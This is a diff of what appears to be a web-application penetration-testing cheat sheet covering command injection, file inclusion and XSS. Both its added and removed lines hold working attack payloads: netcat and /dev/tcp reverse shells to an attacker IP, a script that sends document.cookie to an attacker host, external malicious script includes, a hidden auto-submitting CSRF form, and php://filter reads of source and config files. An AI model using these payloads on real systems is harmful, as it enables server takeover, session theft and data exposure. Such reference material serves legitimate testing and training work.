@@ -4,23 +4,45 @@ category: Web Application
 order: 4
 ---
 
-> **Command Injection**
+> **Test for Command Injection**
 
-Prefixs before attack payload (command seperator): | <code> &, &&, ||,  <, >, ;, $() </code>
+Prefixs before attack payload (command seperator): | <code> ``, &, &&, ||,  <, >, ;, $() </code>
 Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
 Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
 Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
+Test Blind Sleep: | <code> http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10 </code>
+Commix | <code> commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" </code>
+Commix 2 | <code> python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4" </code>
+
+> **Exploit Command Injection**
+
+{% highlight bash %}
+#Attacker Machine
+tcpdump -n host <webserver IP> and ICMP
+nc -l [port]
+#Victim
+test; ping -c 4 <yourAttackerIP>; echo hello 
+test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
+#Alternative to NC for non-debian based distrobutions
+/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 
+{% endhighlight %}
+
 
 > **File Inclusion**
 
 **Test Strings:**
 
-Linux Test String 1 | <code> file%3a%2f%2f%2fetc%2fpasswd </code>
+Linux Test String 1 | <code> http://website/?p=file%3a%2f%2f%2fetc%2fpasswd </code>
 Linux Test String 2 | <code> /ect/passwd </code>
 Linux Test String 3 | <code> ../../../../../../../../../../../../../../ect/passwd </code>
 Windows IIS 1 | <code> ../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
 Windows Test String 1 | <code> %WINDIR%\win.ini </code>
 Windows Test String 2 | <code> %SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
+
+**Test Tool - fimap**
+{% highlight bash %}
+fimap -u 'http://website/?p=file.html'
+{% endhighlight %}
 
 **Using ZAP to Fuzz the URL:**
 1. Right click on request that looks injectable -> fuzz using
@@ -42,6 +64,11 @@ Windows Test String 2 | <code> %SYSTEMDRIVE%\boot.ini //note only older versions
 * /var/www/html
 * /home/username/public_html
 * /use/lib/cgi-bin
+
+**Grab PHP files and Binary Data**
+Obtain Base64 Data | <code> http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini <br> http://website/?p=php://filter/convert.base64-encode/resource=index.php </code>
+Decode base64 data | <code> curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d </code>
+
 
 **Auto-Extension (.php) Bypass:**
 * NULL "%00"
@@ -180,112 +207,6 @@ POST:
 <script>document.getElementById('CSRF').submit();</script>
 {% endhighlight %}
 
-> **XSS**
-
-Get Cookie:
-{% highlight html %}
-<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
-{% endhighlight %}
-
-POST:
-{% highlight html %}
-<form  ID=CSRF action="<website>" method="POST">
-<input type="hidden" name="<paramater>" value="<value>"/>
-<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
-       tabindex="-1"/>
-</form>
-<script>document.getElementById('CSRF').submit();</script>
-{% endhighlight %}
-
-
-> **XSS Test Strings**
-
-{% highlight html %}
-'';!--"<XSS>=&{()}
-{% endhighlight %}
-
-{% highlight html %}
-<script>alert(document.cookie);</script>
-
-<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
-
-<script src=http://www.example.com/malicious-code.js></script>
-
-%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
-
-\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
-
->"><script>alert("XSS")</script>&
-
-"><STYLE>@import"javascript:alert('XSS')";</STYLE>
-
-<IMG SRC="javascript:alert('XSS');">
-
-<IMG SRC=javascript:alert('XSS')>
-
-<IMG SRC=JaVaScRiPt:alert('XSS')> 
-
-<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
-
-<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
-
-<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
-
-<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
-
-{% endhighlight %}
-
-
-
-> **Local File Include**
-
-{% highlight bash %}
-#Automated Tool
-fimap -u 'http://website/?p=file.html'
-
-#Test for Local File Include
-http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
-
-#Grab data
-http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini
-http://utilities.snrt.io/?p=php://filter/convert.base64-encode/resource=index.php
-
-#Rebuild Base64 file (e.g.,executable)
-base64 -d extractedBase64File > executable2
-curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d
-
-{% endhighlight %}
-
-> **Command Injection**
-{% highlight bash %}
-#Commix Automated Tool
-commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
-python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
-
-
-#Test Strings
-test`pwd`
-test$(pwd)
-test; pwd
-test | pwd
-test && pwd
-{% endhighlight %}
-
-> **Blind Command Injection**
-
-{% highlight bash %}
-#Attacker Machine
-tcpdump -n host <webserver IP> and ICMP
-nc -l [port]
-#Victim
-test; ping -c 4 <yourAttackerIP>; echo hello 
-test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
-#Alternative to NC for non-debian based distrobutions
-/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 
-
-#Sleep method
-http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10
-{% endhighlight %}
 
 > **Web Shells**
 
